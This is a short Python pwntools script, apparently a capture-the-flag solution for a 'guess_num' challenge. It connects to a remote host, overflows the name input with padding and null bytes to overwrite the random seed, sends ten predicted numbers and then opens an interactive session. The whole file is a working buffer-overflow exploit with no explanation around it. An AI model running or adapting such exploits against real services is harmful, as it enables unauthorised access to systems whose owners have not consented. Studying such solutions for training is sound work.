from pwn import *

#sh=process('./guess_num')
sh=remote('111.198.29.45','32542')
sh.recvuntil('name:')
sh.sendline('a'*0x20+'\x00'*8)
#gdb.attach(sh)
a = [2,5,4,2,6,2,5,1,4,2]

for i in range(0,10):
	sh.recvuntil('number:')
	sh.sendline(str(a[i]))
#gdb.attach(sh)
sh.interactive()
